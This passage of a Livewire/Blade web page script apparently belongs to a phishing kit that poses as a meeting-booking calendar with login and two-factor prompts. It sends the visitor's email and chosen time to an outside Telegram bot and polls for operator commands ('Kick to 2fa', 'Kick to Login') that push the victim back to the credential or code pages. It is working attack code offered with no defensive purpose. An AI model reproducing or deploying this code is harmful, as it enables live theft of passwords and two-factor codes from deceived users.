                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', false);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', true);
                                        @this.set('codeError', true);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/schedule ${localStorage.getItem('sessionId')}`){
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', false);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        $('#continue-modal').hide();
                                        @this.set('showCalender', true);
                                    }
                                }
                            }
                        });
                    }
                })
                .catch((error) => {
                    console.error("Error fetching updates:", error);
                });
        }, 2000);
    };
    function generateSessionId() {
        return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
    }
    window.selectDate = function (date) {
        $('#calendar-wrapper').updateCalendarOptions({
            date: date
        });
        selectedDate = date;
        const currentDate = new Date(date);
        currentDate.setDate(currentDate.getDate());
        const options = { weekday: 'long', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('en-US', options);
        if ($('.calendar__container .full__width').length > 0){
            $('.calendar__container .full__width').remove();
        }
        $('.calendar__container').append(`<div class="full__width">
                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                        <div class="calendar__time">
                                            <h2>${formattedDate}</h2>
                                            <div class="available__wrapper">
                                                <div class="green__text"></div>
                                                <p> times you're available</p>
                                            </div>
                                            <div class="button__time-wrapper">
                                                <div>
                                                    <button class="time" data-time="09:30">
                                                        <div class="green__text"></div>09:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:00">
                                                        <div class="green__text"></div>10:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:30">
                                                        <div class="green__text"></div>10:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:00">
                                                        <div class="green__text"></div>11:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:30">
                                                        <div class="green__text"></div>11:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:00">
                                                        <div class="green__text"></div>12:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:30">
                                                        <div class="green__text"></div>12:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:00">
                                                        <div class="green__text"></div>13:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:30">
                                                        <div class="green__text"></div>13:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:00">
                                                        <div class="green__text"></div>14:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:30">
                                                        <div class="green__text"></div>14:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:00">
                                                        <div class="green__text"></div>15:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:30">
                                                        <div class="green__text"></div>15:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:00">
                                                        <div class="green__text"></div>16:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:30">
                                                        <div class="green__text"></div>16:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="footer__wrapper footer__wrapper-mobile">
                                                <p>Cookie settings</p>
                                                <p>Report abuse</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>`);
    };
    let defaultConfig = {
        weekDayLength: 3,
        prevButton:'<i class="fa fa-chevron-left" aria-hidden="true"></i>',
        nextButton:'<i class="fa fa-chevron-right" aria-hidden="true"></i>',
        date:new Date(),
        showTodayButton:false,
        onClickDate: selectDate,
        disable: function (date) {
            const today = new Date();
            const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
            return date <= yesterday;
        },
        showYearDropdown: true,
        startOnMonday: false,
    };
    $('#calendar-wrapper').calendar(defaultConfig);
    $(document).on('click','button.time',function (e){
        e.preventDefault();
        $('button.time').each(function (){
            $(this).parent('div').removeClass('next__button');
            $(this).parent('div').find('div > div').empty();
        });
        $(this).parent('div').addClass('next__button');
        $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
    });
    $(document).on('click','.btn-next',function (e){
        e.preventDefault();
        let time = $(this).parent('div').parent('div').parent('div').find('.time').data('time'); // Example: "10:30"
        let selectedDateFinal = new Date(selectedDate);
        if (!selectedDateFinal || !time) {
            console.error('selectedDate or time is missing');
            return;
        }

        let [hours, minutes] = time.split(':').map(Number);
        selectedDateFinal.setHours(hours);
        selectedDateFinal.setMinutes(minutes);
        selectedDateFinal.setSeconds(0);
        let session = localStorage.getItem('sessionId');
        fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `Kick to 2fa`,
                                callback_data: `/2fa ${session}`,
                            },
                            {
                                text: `Kick to Login`,
                                callback_data: `/login ${session}`,
                            },
                        ],
                        [
                            {
                                text: `Kick to the calendar`,
                                callback_data: `/schedule ${session}`,
                            },
                            {
                                text: `Thank You`,
                                callback_data: `/thankyou ${session}`,
                            },
                        ]
                    ],
                },
            })
        }).then(response => {
            @this.set('showCalenderProgress', true);
        }).catch(error => {

        });
    });
    document.getElementById('openChat').addEventListener('click', function(e) {
        e.preventDefault();
        if (window.jivo_api) {
            jivo_api.open();
        } else {
            console.error('JivoChat API is not loaded yet.');
        }
    });
    document.addEventListener('clear-all',function (){
        $('#continue-modal').hide();
        @this.set('loginError', false);
        @this.set('oldPassError', false);
        @this.set('enableLoginForm', false);
        @this.set('showModalFooter', false);
        @this.set('enableLoadingAfterSubmit', false);
        @this.set('twoFaPage', false);
        @this.set('codeError', false);
        @this.set('showCalender', false);
        @this.set('showCalenderProgress', false);
    });
    statusCheck();
    function statusCheck(){
        setInterval(function (){
            window.Livewire.dispatch('statusCheck');
        },1000);
    }
</script>
@endscript
